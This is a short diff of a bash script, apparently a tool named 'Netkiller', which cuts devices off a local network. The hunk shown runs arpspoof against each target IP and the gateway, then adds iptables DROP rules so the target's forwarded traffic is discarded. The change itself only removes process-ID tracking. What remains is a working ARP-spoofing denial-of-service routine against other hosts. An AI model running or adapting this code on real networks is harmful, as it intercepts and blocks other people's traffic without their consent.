@@ -232,11 +232,9 @@ fi
 echo " "
 
 # Start ARP spoofing for each target
-PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-     PIDS+=($!)
      iptables -A FORWARD -s "$TARGET" -j DROP
      iptables -t mangle -A FORWARD -s "$TARGET" -j DROP
      iptables -t mangle -A PREROUTING -s "$TARGET" -j DROP
